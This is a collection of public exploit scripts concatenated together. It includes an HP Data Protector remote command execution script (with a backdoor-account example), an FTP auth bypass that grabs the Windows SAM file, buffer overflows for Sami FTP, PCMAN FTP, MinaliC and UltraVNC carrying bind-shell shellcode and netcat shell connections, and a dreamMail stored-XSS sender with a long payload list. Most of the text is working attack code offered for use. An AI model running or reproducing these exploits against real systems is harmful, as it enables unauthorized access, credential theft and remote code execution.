HP Data Protector Arbitrary Remote Command Execution

This script allows to execute a command with an arbitrary number of
arguments. The trick calls 'perl.exe' interpreter installed with HP Data
Protector inside the directory {install_path}/bin/.

The main goal of the script is to bypass the limitation of executing only a
single command without any parameter, as provided by already existing
exploits. As shown below, it's possible to exploit the security issue in order
to run any command inside the target system.

Target OS:
  Microsoft Windows

Tested Version:
  HP Data Protector A.06.20

Usage: 
  exploit.py <target> <port> <command>

Example: 
  exploit.py 192.168.1.1 5555 'dir c:\'
  exploit.py 192.168.1.1 5555 'ipconfig /all'
  exploit.py 192.168.1.1 5555 'net user userbackdoor pwdbackdoor /ADD'

Authors: 
  Alessandro Di Pinto ( alessandro.dipinto () artificialstudios org )
  Claudio Moletta     ( mclaudio () gmail com )

Reference:
  http://www.zerodayinitiative.com/advisories/ZDI-11-055/
  http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-0923
  http://h20000.www2.hp.com/bizsupport/TechSupport/Document.jsp?objectID=c02781143
"""

import socket
import struct
import sys

def usage():
    print >> sys.stderr, "Usage: %s <target> <port> <command>" % sys.argv[0]
    exit(-1)

def exploit(host, port, command):
    # Try to connect
    print >> sys.stderr, "[*] Connecting to target '%s:%s'..." % (host, port)
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        sock.connect((host, int(port)))
    except Exception as ex:
        print >> sys.stderr, "[!] Socket error: \n\t%s" % ex
        exit(-3)
    else:
        print >> sys.stderr, "[*] Connected to the target."
    
    # Connected, build the malicious payload
    OFFSET = 46
    command = command.replace("\\", "\\\\")
    command_size = chr(OFFSET + len(command))
    CRAFTED_PKT = "\x00\x00\x00" + \
                  command_size   + \
                  "\x32\x00\x01" + \
                  "\x01\x01\x01" + \
                  "\x01\x01\x00" + \
                  "\x01\x00\x01" + \
                  "\x00\x01\x00" + \
                  "\x01\x01\x00" + \
                  "\x2028\x00"   + \
                  "\\perl.exe"   + \
                  "\x00 -esystem('%s')\x00" % command
    
    # Send payload to target
    print >> sys.stderr, "[*] Sending payload '%s'" % command
    sock.sendall(CRAFTED_PKT)
    
    # Parse the response back
    print >> sys.stderr, "[*] Output:"
    while True:
        # Get information about response
        response_size = sock.recv(4)
        if not response_size: break
        n = struct.unpack(">I", response_size)[0]

        # Get command results
        # code  = response[:5]
        # data  = response[5:]
        response = sock.recv(n)

        # Clean and parse results
        response = response[5:].strip()
        response = response.replace("\n", "")
        response = response.replace("\x00", "")
        # Check for the end-of-message
        if response.upper().find("*RETVAL*") != -1:
            break
        print response

    # Close connection
    sock.close()

if __name__ == "__main__":
    # Get command-line
    argc = len(sys.argv)
    if argc < 4:
        usage()
    host = sys.argv[1]
    port = sys.argv[2]
    cmd  = sys.argv[3]
    if port.isdigit():
        port = int(port)
    else:
        print >> sys.stderr, "[!] Error, invalid port value"
        exit(-2)

    # Send malicious payload
    exploit(host, port, cmd)
    exit(0)
#!/usr/bin/python
# Exploit Title: Open&Compact Ftp Server <= 1.2 Auth bypass & directory traversal sam retrieval
# Date: Aug 7, 2013
# By Wireghoul - http://www.justanotherhacker.com
# Based on Serge Gorbunov's auth bypass (http://www.exploit-db.com/exploits/13932/)
# Software Link: http://sourceforge.net/projects/open-ftpd/
# Version: <= 1.2
# Tested on: Windows 7, Windows XP SP3

# Abusing authentication bypass in combination with a directory traversal to grab
# the sam file for offline cracking

import ftplib
import os

# Connect to server

ftp = ftplib.FTP( "192.168.58.135" )
ftp.set_pasv( False )

# Note that we need no authentication at all!!

print ftp.sendcmd( 'CWD C:\\\\windows\\\\repair\\\\' )
print ftp.retrbinary('RETR sam', open('sam', 'wb').write )

ftp.quit()


#!/usr/bin/python

# Exploit Title: Sami FTP MKD buffer overflow (SEH) + Bypass ASL
# Date: 11 Agosto 2013
# Exploit Author: Christian (Polunchis) Ramirez https://intrusionlabs.org
# Vendor Homepage: http://www.karjasoft.com/old.php
# Version: Sami FTP Server 2.0.1
# Tested on: Windows 7 Home Basic x86, Spanish
# Thanks:To my wife for putting up with my possessions
#       
# Description: 
# A buffer overflow is triggered when a long MKD command is sent to the server and the user views the Log tab.
 
import socket, sys, os, time

if len(sys.argv) != 3:
        print "[*] Uso: %s <Ip Victima> <Puerto> \n" % sys.argv[0]
        print "[*] Exploit created by Polunchis"
        print "[*] https://www.intrusionlabs.org"
        sys.exit(0)
target = sys.argv[1]
port = int(sys.argv[2])

#msfpayload windows/shell_bind_tcp LPORT=28876 R | msfencode -a x86 -b '\x00\xff\x0a\x0d\x20\x40' -t c
shellcode = (
"\xda\xcf\xb8\xba\xb3\x1e\xe7\xd9\x74\x24\xf4\x5a\x33\xc9\xb1"
"\x56\x31\x42\x18\x83\xc2\x04\x03\x42\xae\x51\xeb\x1b\x26\x1c"
"\x14\xe4\xb6\x7f\x9c\x01\x87\xad\xfa\x42\xb5\x61\x88\x07\x35"
"\x09\xdc\xb3\xce\x7f\xc9\xb4\x67\x35\x2f\xfa\x78\xfb\xef\x50"
"\xba\x9d\x93\xaa\xee\x7d\xad\x64\xe3\x7c\xea\x99\x0b\x2c\xa3"
"\xd6\xb9\xc1\xc0\xab\x01\xe3\x06\xa0\x39\x9b\x23\x77\xcd\x11"
"\x2d\xa8\x7d\x2d\x65\x50\xf6\x69\x56\x61\xdb\x69\xaa\x28\x50"
"\x59\x58\xab\xb0\x93\xa1\x9d\xfc\x78\x9c\x11\xf1\x81\xd8\x96"
"\xe9\xf7\x12\xe5\x94\x0f\xe1\x97\x42\x85\xf4\x30\x01\x3d\xdd"
"\xc1\xc6\xd8\x96\xce\xa3\xaf\xf1\xd2\x32\x63\x8a\xef\xbf\x82"
"\x5d\x66\xfb\xa0\x79\x22\x58\xc8\xd8\x8e\x0f\xf5\x3b\x76\xf0"
"\x53\x37\x95\xe5\xe2\x1a\xf2\xca\xd8\xa4\x02\x44\x6a\xd6\x30"
"\xcb\xc0\x70\x79\x84\xce\x87\x7e\xbf\xb7\x18\x81\x3f\xc8\x31"
"\x46\x6b\x98\x29\x6f\x13\x73\xaa\x90\xc6\xd4\xfa\x3e\xb8\x94"
"\xaa\xfe\x68\x7d\xa1\xf0\x57\x9d\xca\xda\xee\x99\x04\x3e\xa3"
"\x4d\x65\xc0\x33\x42\xe0\x26\xd9\x4a\xa5\xf1\x75\xa9\x92\xc9"
"\xe2\xd2\xf0\x65\xbb\x44\x4c\x60\x7b\x6a\x4d\xa6\x28\xc7\xe5"
"\x21\xba\x0b\x32\x53\xbd\x01\x12\x1a\x86\xc2\xe8\x72\x45\x72"
"\xec\x5e\x3d\x17\x7f\x05\xbd\x5e\x9c\x92\xea\x37\x52\xeb\x7e"
"\xaa\xcd\x45\x9c\x37\x8b\xae\x24\xec\x68\x30\xa5\x61\xd4\x16"
"\xb5\xbf\xd5\x12\xe1\x6f\x80\xcc\x5f\xd6\x7a\xbf\x09\x80\xd1"
"\x69\xdd\x55\x1a\xaa\x9b\x59\x77\x5c\x43\xeb\x2e\x19\x7c\xc4"
"\xa6\xad\x05\x38\x57\x51\xdc\xf8\x67\x18\x7c\xa8\xef\xc5\x15"
"\xe8\x6d\xf6\xc0\x2f\x88\x75\xe0\xcf\x6f\x65\x81\xca\x34\x21"
"\x7a\xa7\x25\xc4\x7c\x14\x45\xcd"
)

# SEH overwritten at offset 468
# pop\pop\ret ESP at C:\Program Files\PMSystem\Temp\tmp0.dll (Universal)
# pop/pop/ret 10022689

jmpshort = '\xeb\x06\x90\x90'
nexseh= '\x89\x26\x02\x10'
garbage= '\x41' * 468
fixstack= '\x81\xc4\x48\xf4\xff\xff'

buffer = garbage + jmpshort + nexseh + fixstack + shellcode 

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
print "[+] Connect to %s on port %d" % (target,port)
try:
	s.connect((target,port))
        s.recv(1024)
	s.send('USER polunchis\r\n') 
	s.recv(1024)
	s.send('PASS polunchis\r\n')
	s.recv(1024)
	s.send("MKD " + buffer + "\r\n")
        print "[+] Sending payload of size", len(buffer) 
	print s.recv(1024)
	s.close()
	print "[+] Exploit Sent Successfully"
	print "[+] Waiting for 5 sec before spawning shell to " + target + ":28876\r"
	print "\r"
	time.sleep(5)
	os.system ("nc -n " + target + " 28876")
	print "[-] Connection lost from " + target + ":28876 \r"
except:
	print "[-] Could not connect to " + target + ":21\r"
        sys.exit(0) 
#!/usr/bin/env python
 
# Exploit Title: MinaliC Webserver buffer overflow (egghunter)
# Date: August 13 2013
# Exploit Author: PuN1sh3r 
# Email: luiguibiker@gmail.com
# Vendor Homepage: http://minalic.sourceforge.net/
# Version: MinaliC Webserver 2.0.0
# Tested on: Windows XP Pro SP3, English
#
# Description:
# Remote command execution by triggering a buffer overflow in the GET 
# request along with some buffer gymnastics using egghunters in order to attain a shell .
# gr33zt to superkojiman for the initial exploit  
 
import socket
# windows/shell_bind_tcp  http://www.metasploit.com
# * VERBOSE=false, LPORT=443, RHOST=, EXITFUNC=process,InitialAutoRunScript=, AutoRunScript=

shellcode = (
"\x89\xe7\xda\xc0\xd9\x77\xf4\x5b\x53\x59\x49\x49\x49\x49\x49"
"\x49\x49\x49\x49\x49\x43\x43\x43\x43\x43\x43\x37\x51\x5a\x6a"
"\x41\x58\x50\x30\x41\x30\x41\x6b\x41\x41\x51\x32\x41\x42\x32"
"\x42\x42\x30\x42\x42\x41\x42\x58\x50\x38\x41\x42\x75\x4a\x49"
"\x49\x6c\x49\x78\x6b\x39\x37\x70\x33\x30\x77\x70\x43\x50\x4d"
"\x59\x38\x65\x44\x71\x6b\x62\x73\x54\x6e\x6b\x61\x42\x34\x70"
"\x4c\x4b\x43\x62\x74\x4c\x6c\x4b\x36\x32\x56\x74\x4c\x4b\x72"
"\x52\x75\x78\x44\x4f\x68\x37\x70\x4a\x67\x56\x66\x51\x4b\x4f"
"\x34\x71\x4b\x70\x4c\x6c\x55\x6c\x61\x71\x51\x6c\x63\x32\x76"
"\x4c\x77\x50\x4b\x71\x4a\x6f\x34\x4d\x47\x71\x58\x47\x5a\x42"
"\x58\x70\x70\x52\x33\x67\x4c\x4b\x53\x62\x52\x30\x4e\x6b\x30"
"\x42\x65\x6c\x57\x71\x68\x50\x4c\x4b\x77\x30\x62\x58\x6d\x55"
"\x49\x50\x71\x64\x30\x4a\x56\x61\x5a\x70\x42\x70\x4c\x4b\x52"
"\x68\x66\x78\x6c\x4b\x42\x78\x45\x70\x56\x61\x6a\x73\x79\x73"
"\x35\x6c\x77\x39\x4c\x4b\x77\x44\x6c\x4b\x76\x61\x4e\x36\x65"
"\x61\x6b\x4f\x34\x71\x69\x50\x4e\x4c\x7a\x61\x38\x4f\x54\x4d"
"\x63\x31\x4a\x67\x76\x58\x79\x70\x34\x35\x6a\x54\x55\x53\x61"
"\x6d\x7a\x58\x35\x6b\x61\x6d\x31\x34\x43\x45\x58\x62\x30\x58"
"\x4c\x4b\x73\x68\x44\x64\x47\x71\x6e\x33\x62\x46\x4c\x4b\x66"
"\x6c\x30\x4b\x4e\x6b\x32\x78\x55\x4c\x63\x31\x48\x53\x4c\x4b"
"\x63\x34\x4e\x6b\x75\x51\x38\x50\x4b\x39\x62\x64\x61\x34\x71"
"\x34\x61\x4b\x63\x6b\x61\x71\x63\x69\x53\x6a\x76\x31\x59\x6f"
"\x4d\x30\x33\x68\x31\x4f\x30\x5a\x4c\x4b\x37\x62\x48\x6b\x4d"
"\x56\x63\x6d\x53\x58\x36\x53\x70\x32\x73\x30\x57\x70\x32\x48"
"\x74\x37\x71\x63\x37\x42\x33\x6f\x43\x64\x73\x58\x30\x4c\x61"
"\x67\x45\x76\x76\x67\x79\x6f\x58\x55\x38\x38\x6e\x70\x65\x51"
"\x63\x30\x33\x30\x57\x59\x4b\x74\x31\x44\x76\x30\x51\x78\x54"
"\x69\x4f\x70\x52\x4b\x33\x30\x6b\x4f\x79\x45\x56\x30\x32\x70"
"\x76\x30\x56\x30\x43\x70\x56\x30\x53\x70\x36\x30\x51\x78\x49"
"\x7a\x54\x4f\x59\x4f\x79\x70\x4b\x4f\x4a\x75\x6d\x59\x6b\x77"
"\x54\x71\x4b\x6b\x76\x33\x65\x38\x76\x62\x73\x30\x45\x51\x4d"
"\x6b\x4c\x49\x4a\x46\x53\x5a\x64\x50\x71\x46\x50\x57\x52\x48"
"\x68\x42\x4b\x6b\x34\x77\x65\x37\x4b\x4f\x4e\x35\x33\x63\x42"
"\x77\x35\x38\x38\x37\x6b\x59\x44\x78\x6b\x4f\x49\x6f\x6e\x35"
"\x33\x63\x73\x63\x50\x57\x65\x38\x64\x34\x7a\x4c\x45\x6b\x6d"
"\x31\x59\x6f\x79\x45\x61\x47\x6e\x69\x6a\x67\x65\x38\x70\x75"
"\x52\x4e\x62\x6d\x63\x51\x79\x6f\x48\x55\x51\x78\x53\x53\x42"
"\x4d\x51\x74\x65\x50\x6e\x69\x6a\x43\x36\x37\x53\x67\x53\x67"
"\x50\x31\x39\x66\x50\x6a\x45\x42\x62\x79\x43\x66\x48\x62\x59"
"\x6d\x72\x46\x78\x47\x37\x34\x37\x54\x47\x4c\x33\x31\x65\x51"
"\x4e\x6d\x57\x34\x64\x64\x54\x50\x59\x56\x57\x70\x70\x44\x33"
"\x64\x70\x50\x73\x66\x61\x46\x33\x66\x67\x36\x53\x66\x50\x4e"
"\x42\x76\x43\x66\x72\x73\x56\x36\x62\x48\x71\x69\x48\x4c\x45"
"\x6f\x6d\x56\x59\x6f\x78\x55\x4c\x49\x49\x70\x42\x6e\x30\x56"
"\x47\x36\x59\x6f\x66\x50\x72\x48\x63\x38\x4d\x57\x65\x4d\x33"
"\x50\x6b\x4f\x4e\x35\x4d\x6b\x48\x70\x48\x35\x4f\x52\x63\x66"
"\x72\x48\x4f\x56\x4c\x55\x6d\x6d\x4f\x6d\x39\x6f\x5a\x75\x57"
"\x4c\x33\x36\x71\x6c\x37\x7a\x4d\x50\x79\x6b\x59\x70\x72\x55"
"\x54\x45\x4d\x6b\x43\x77\x55\x43\x72\x52\x42\x4f\x61\x7a\x57"
"\x70\x36\x33\x49\x6f\x5a\x75\x41\x41"
)
# Return addres Note:
# 77C11F13  JMP EBX on msvcrt.dll Windows XP SP3 English
ret = "\x13\x1F\xC1\x77" 
junk = "\x41" *  245 + ret
host = "\x90" * 30 + "A" * 40  + "\x90" * 31

egg =  "\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74\xef\xb8\x54\x30\x30\x57\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7" 
buf = "GET /" + junk + " HTTP/1.1\r\n" + "Host: " + "\x90" * (100 - len(egg)) + egg     + "\r\n"
buf += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
buf += "User-Agent: " + "T00W" + "T00W" +  "\x90" * (900 - len(shellcode)) + shellcode  + "\r\n\r\n" 
print buf
print "[+] sending buffer size", len(buf)
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("192.168.1.5", 8080))
s.send(buf)
source: http://www.securityfocus.com/bid/17378/info

UltraVNC is susceptible to multiple error-logging remote buffer-overflow vulnerabilities. These issues are due to the application's failure to properly bounds-check user-supplied input before copying it to insufficiently sized memory buffers.

A successful attack may allow remote attackers to execute arbitrary code on a vulnerable computer to gain unauthorized access in the context of the application.

#!/usr/bin/python

#Ultr@VNC 1.0.1 Client Buffer Overflow - Luigi Auriemm
#POC by Paul Haas at Redspin.com
#Tested on WinXP SP 2: Launches Calc
import socket, struct

HOST = ''                       # Localhost
PORT = 5900                     # VNC Server
BOFSZ = 1024                    # Buffer Size
HEAD = "RFB 003.006\n"          # VNC Header
MESSAGE = "Requires Ultr@VNC Authentication\n"
NOP = "\x90"                    # Standard x86 NOP
JMP = "\xE9\x1B\xFC\xFF\xFF"    # JMP To BUFF
ESP = "\xE0\x3A\xB4\x76"        # winmm.dll: JMP %esp
POP = "PASSWORD"                # RET 8

# win32_exec - CMD=calc Size=160 http://metasploit.com
SHELLCODE = \
"\x31\xc9\x83\xe9\xde\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\xe1"+\
"\x7c\x05\xd9\x83\xeb\xfc\xe2\xf4\x1d\x94\x41\xd9\xe1\x7c\x8e\x9c"+\
"\xdd\xf7\x79\xdc\x99\x7d\xea\x52\xae\x64\x8e\x86\xc1\x7d\xee\x90"+\
"\x6a\x48\x8e\xd8\x0f\x4d\xc5\x40\x4d\xf8\xc5\xad\xe6\xbd\xcf\xd4"+\
"\xe0\xbe\xee\x2d\xda\x28\x21\xdd\x94\x99\x8e\x86\xc5\x7d\xee\xbf"+\
"\x6a\x70\x4e\x52\xbe\x60\x04\x32\x6a\x60\x8e\xd8\x0a\xf5\x59\xfd"+\
"\xe5\xbf\x34\x19\x85\xf7\x45\xe9\x64\xbc\x7d\xd5\x6a\x3c\x09\x52"+\
"\x91\x60\xa8\x52\x89\x74\xee\xd0\x6a\xfc\xb5\xd9\xe1\x7c\x8e\xb1"+\
"\xdd\x23\x34\x2f\x81\x2a\x8c\x21\x62\xbc\x7e\x89\x89\x8c\x8f\xdd"+\
"\xbe\x14\x9d\x27\x6b\x72\x52\x26\x06\x1f\x64\xb5\x82\x7c\x05\xd9"

#buff = MESSAGE+SHELLCODE+NOP SLED+RET ADDR+USELESS+JUMP TO BUFF
buff = MESSAGE+SHELLCODE+NOP*(BOFSZ-11-len(MESSAGE)-len(SHELLCODE))
buff = buff+ESP+POP+JMP

#Egg = VNC Server Error Reply and Size of Reply + buff
egg = struct.pack('LL',socket.htonl(0),socket.htonl(len(buff)))+buff

print 'Ultr@VNC 1.0.1 Client Buffer Overflow - Luigi Auriemma'
print 'POC by Paul Haas at Redspin.com'
print 'Server listening on port', PORT

#Server Loop
while(1):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.bind((HOST, PORT))
        s.listen(1)

        conn, addr = s.accept()
        print 'Connection by', addr

        conn.send(HEAD)
        data = conn.recv(12)

        conn.send(egg)
        conn.close()
#!/usr/bin/python

# Exploit Title: PCMAN FTP 2.07 STOR Command - buffer overflow
# Date: 18 Agosto 2013
# Exploit Author: Christian (Polunchis) Ramirez https://intrusionlabs.org
# Contact: polunchis@intrusionlabs.org
# Version: PCMAN FTP 2.07 STOR Command
# Tested on: Windows XP SP3, Spanish
# Thanks:To GOD for giving me wisdom 
#       
# Description: 
# A buffer overflow is triggered when a long STOR command is sent to the server continued of these  /../ parameters  

import socket, sys, os, time

if len(sys.argv) != 3:
        print "[*] Uso: %s <Ip Victima> <Puerto> \n" % sys.argv[0]
        print "[*] Exploit created by Polunchis"
        print "[*] https://www.intrusionlabs.org"
        sys.exit(0)
target = sys.argv[1]
port = int(sys.argv[2])

#msfpayload windows/shell_bind_tcp LPORT=28876 R | msfencode -a x86 -b '\x00\xff\x0a\x0d\x20\x40' -t c
shellcode = (
"\xda\xcf\xb8\xba\xb3\x1e\xe7\xd9\x74\x24\xf4\x5a\x33\xc9\xb1"
"\x56\x31\x42\x18\x83\xc2\x04\x03\x42\xae\x51\xeb\x1b\x26\x1c"
"\x14\xe4\xb6\x7f\x9c\x01\x87\xad\xfa\x42\xb5\x61\x88\x07\x35"
"\x09\xdc\xb3\xce\x7f\xc9\xb4\x67\x35\x2f\xfa\x78\xfb\xef\x50"
"\xba\x9d\x93\xaa\xee\x7d\xad\x64\xe3\x7c\xea\x99\x0b\x2c\xa3"
"\xd6\xb9\xc1\xc0\xab\x01\xe3\x06\xa0\x39\x9b\x23\x77\xcd\x11"
"\x2d\xa8\x7d\x2d\x65\x50\xf6\x69\x56\x61\xdb\x69\xaa\x28\x50"
"\x59\x58\xab\xb0\x93\xa1\x9d\xfc\x78\x9c\x11\xf1\x81\xd8\x96"
"\xe9\xf7\x12\xe5\x94\x0f\xe1\x97\x42\x85\xf4\x30\x01\x3d\xdd"
"\xc1\xc6\xd8\x96\xce\xa3\xaf\xf1\xd2\x32\x63\x8a\xef\xbf\x82"
"\x5d\x66\xfb\xa0\x79\x22\x58\xc8\xd8\x8e\x0f\xf5\x3b\x76\xf0"
"\x53\x37\x95\xe5\xe2\x1a\xf2\xca\xd8\xa4\x02\x44\x6a\xd6\x30"
"\xcb\xc0\x70\x79\x84\xce\x87\x7e\xbf\xb7\x18\x81\x3f\xc8\x31"
"\x46\x6b\x98\x29\x6f\x13\x73\xaa\x90\xc6\xd4\xfa\x3e\xb8\x94"
"\xaa\xfe\x68\x7d\xa1\xf0\x57\x9d\xca\xda\xee\x99\x04\x3e\xa3"
"\x4d\x65\xc0\x33\x42\xe0\x26\xd9\x4a\xa5\xf1\x75\xa9\x92\xc9"
"\xe2\xd2\xf0\x65\xbb\x44\x4c\x60\x7b\x6a\x4d\xa6\x28\xc7\xe5"
"\x21\xba\x0b\x32\x53\xbd\x01\x12\x1a\x86\xc2\xe8\x72\x45\x72"
"\xec\x5e\x3d\x17\x7f\x05\xbd\x5e\x9c\x92\xea\x37\x52\xeb\x7e"
"\xaa\xcd\x45\x9c\x37\x8b\xae\x24\xec\x68\x30\xa5\x61\xd4\x16"
"\xb5\xbf\xd5\x12\xe1\x6f\x80\xcc\x5f\xd6\x7a\xbf\x09\x80\xd1"
"\x69\xdd\x55\x1a\xaa\x9b\x59\x77\x5c\x43\xeb\x2e\x19\x7c\xc4"
"\xa6\xad\x05\x38\x57\x51\xdc\xf8\x67\x18\x7c\xa8\xef\xc5\x15"
"\xe8\x6d\xf6\xc0\x2f\x88\x75\xe0\xcf\x6f\x65\x81\xca\x34\x21"
"\x7a\xa7\x25\xc4\x7c\x14\x45\xcd"
)

# 7C86467B   FFE4             JMP ESP
# JMP ESP KERNEL32.DLL
garbage= '\x41' * 2005
jmpesp= '\x7B\x46\x86\x7C'
fixstack= '\x83\xc4\x9c'
vulparameter= '/../'
nop='\x90' *4

buffer = garbage + jmpesp + nop + fixstack + shellcode

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
print "[+] Connect to %s on port %d" % (target,port)
try:
	s.connect((target,port))
        s.recv(1024)
	s.send('USER anonymous\r\n') 
	s.recv(1024)
	s.send('PASS polunchis\r\n')
	s.recv(1024)
	s.send("STOR " + vulparameter + buffer + "\r\n")
        print "[+] Sending payload of size", len(buffer) 
	s.close()
	print "[+] Exploit Sent Successfully"
	print "[+] Waiting for 5 sec before spawning shell to " + target + ":28876\r"
	print "\r"
	time.sleep(5)
	os.system ("nc -n " + target + " 28876")
	print "[-] Connection lost from " + target + ":28876 \r"
except:
	print "[-] Could not connect to " + target + ":21\r"
        sys.exit(0) 
#!/usr/bin/python
'''

Author: loneferret of Offensive Security
Product: dreamMail e-mail client
Version: 4.6.9.2
Vendor Site: http://www.dreammail.eu
Software Download: http://www.dreammail.eu/intl/en/download.html

Tested on: Windows XP SP3 Eng.
Tested on: Windows 7 Pro SP1 Eng.
dreamMail: Using default settings


E-mail client is vulnerable to stored XSS. Either opening or viewing the e-mail and you 
get an annoying alert box etc etc etc.
Injection Point: Body
 
Gave vendor 7 days to reply in order to co-ordinate a release date. 
Timeline:
16 Aug 2013: Tentative release date 23 Aug 2013
16 Aug 2013: Vulnerability reported to vendor. Provided complete list of payloads.
19 Aug 2013: Still no response. Sent second e-mail.
22 Aug 2013: Got a reply but not from development guy. He seems MIA according to contact.
             No longer supported due to missing development guy. 
23 Aug 2013: Still nothing.
24 Aug 2013: Release

'''

import smtplib, urllib2

payload = '''<IMG SRC='vbscript:msgbox("XSS")'>'''

def sendMail(dstemail, frmemail, smtpsrv, username, password):
        msg  = "From: hacker@offsec.local\n"
        msg += "To: victim@offsec.local\n"
        msg += 'Date: Today\r\n'
        msg += "Subject: XSS payload\n"
        msg += "Content-type: text/html\n\n"
        msg += payload + "\r\n\r\n"
        server = smtplib.SMTP(smtpsrv)
        server.login(username,password)
        try:
                server.sendmail(frmemail, dstemail, msg)
        except Exception, e:
                print "[-] Failed to send email:"
                print "[*] " + str(e)
        server.quit()

username = "acker@offsec.local"
password = "123456"
dstemail = "victim@offsec.local"
frmemail = "acker@offsec.local"
smtpsrv  = "xxx.xxx.xxx.xxx"

print "[*] Sending Email"
sendMail(dstemail, frmemail, smtpsrv, username, password)

'''
List of XSS types and different syntaxes to which the client is vulnerable.
Each payload will pop a message box, usually with the message "XSS" inside.


Paylaod-: ';alert(String.fromCharCode(88,83,83))//\';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//--></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>=&{}

Paylaod-: <SCRIPT SRC=http://server/xss.js></SCRIPT>

Paylaod-: <SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>

Paylaod-: <BODY BACKGROUND="javascript:alert('XSS');">

Paylaod-: <BODY ONLOAD=alert('XSS')>

Paylaod-: <DIV STYLE="background-image: url(javascript:alert('XSS'))">

Paylaod-: <DIV STYLE="background-image: url(&#1;javascript:alert('XSS'))">

Paylaod-: <DIV STYLE="width: expression(alert('XSS'));">

Paylaod-: <IFRAME SRC="javascript:alert('XSS');"></IFRAME>

Paylaod-: <INPUT TYPE="IMAGE" SRC="javascript:alert('XSS');">

Paylaod-: <IMG SRC="javascript:alert('XSS');">

Paylaod-: <IMG SRC=javascript:alert('XSS')>

Paylaod-: <IMG DYNSRC="javascript:alert('XSS');">

Paylaod-: <IMG LOWSRC="javascript:alert('XSS');">Paylaod-: 21exp/*<XSS STYLE='no\xss:noxss("*//*");
xss:&#101;x&#x2F;*XSS*//*/*/pression(alert("XSS"))'>

Paylaod-: <STYLE>li {list-style-image: url("javascript:alert('XSS')");}</STYLE><UL><LI>XSS

Paylaod-: <IMG SRC='vbscript:msgbox("XSS")'>

Paylaod-: <OBJECT classid=clsid:ae24fdae-03c6-11d1-8b76-0080c744f389><param name=url value=javascript:alert('XSS')></OBJECT>

Paylaod-: <IMG STYLE="xss:expr/*XSS*/ession(alert('XSS'))">

Paylaod-: <XSS STYLE="xss:expression(alert('XSS'))">

Paylaod-: <STYLE>.XSS{background-image:url("javascript:alert('XSS')");}</STYLE><A CLASS=XSS></A>

Paylaod-: <STYLE type="text/css">BODY{background:url("javascript:alert('XSS')")}</STYLE>

Paylaod-: <LINK REL="stylesheet" HREF="javascript:alert('XSS');">

Paylaod-: <LINK REL="stylesheet" HREF="http://ha.ckers.org/xss.css">

Paylaod-: <STYLE>@import'http://ha.ckers.org/xss.css';</STYLE>

Paylaod-: <TABLE BACKGROUND="javascript:alert('XSS')"></TABLE>

Paylaod-: <TABLE><TD BACKGROUND="javascript:alert('XSS')"></TD></TABLE>

Paylaod-: <XML ID=I><X><C><![CDATA[<IMG SRC="javas]]><![CDATA[cript:alert('XSS');">]]>
</C></X></xml><SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML>

Paylaod-: <XML SRC="http://ha.ckers.org/xsstest.xml" ID=I></XML>
<SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></SPAN>

Paylaod-: <HTML><BODY>
<?xml:namespace prefix="t" ns="urn:schemas-microsoft-com:time">
<?import namespace="t" implementation="#default#time2">
<t:set attributeName="innerHTML" to="XSS<SCRIPT DEFER>alert('XSS')</SCRIPT>"> </BODY></HTML>

Paylaod-: <!--[if gte IE 4]>
<SCRIPT>alert('XSS');</SCRIPT>
<![endif]-->

Paylaod-: <SCRIPT SRC="http://ha.ckers.org/xss.jpg"></SCRIPT>

Paylaod-: <IMG SRC=JaVaScRiPt:alert('XSS')>

Paylaod-: <IMG SRC=javascript:alert("XSS")>

Paylaod-: <IMG SRC=`javascript:alert("We says, 'XSS'")`>

Paylaod-: <IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>

Paylaod-: <IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>

Paylaod-: <IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>

Paylaod-: <IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>

Paylaod-: <HEAD><META HTTP-EQUIV="CONTENT-TYPE" CONTENT="text/html; charset=UTF-7"> </HEAD>+ADw-SCRIPT+AD4-alert('XSS');+ADw-/SCRIPT+AD4-

Paylaod-: </TITLE><SCRIPT>alert("XSS");</SCRIPT>

Paylaod-: <STYLE>@im\port'\ja\vasc\ript:alert("XSS")';</STYLE>

Paylaod-: <IMG SRC="jav	ascript:alert('XSS');">

Paylaod-: <IMG SRC="jav&#x09;ascript:alert('XSS');">

Paylaod-: <IMG SRC="jav&#x0A;ascript:alert('XSS');">

Paylaod-: <IMG SRC="jav&#x0D;ascript:alert('XSS');">

Paylaod-: <IMG SRC=" &#14;  javascript:alert('XSS');">

Paylaod-: <SCRIPT/XSS SRC="http://server/xss.js"></SCRIPT>

Paylaod-: <SCRIPT SRC=http://server/xss.js

Paylaod-: <IMG SRC="javascript:alert('XSS')"

Paylaod-: <<SCRIPT>alert("XSS");//<</SCRIPT>

Paylaod-: <IMG """><SCRIPT>alert("XSS")</SCRIPT>">

Paylaod-: <SCRIPT>a=/XSS/
alert(a.source)</SCRIPT>

Paylaod-: <SCRIPT a=">" SRC="http://server/xss.js"></SCRIPT>

Paylaod-: <SCRIPT ="blah" SRC="http://server/xss.js"></SCRIPT>

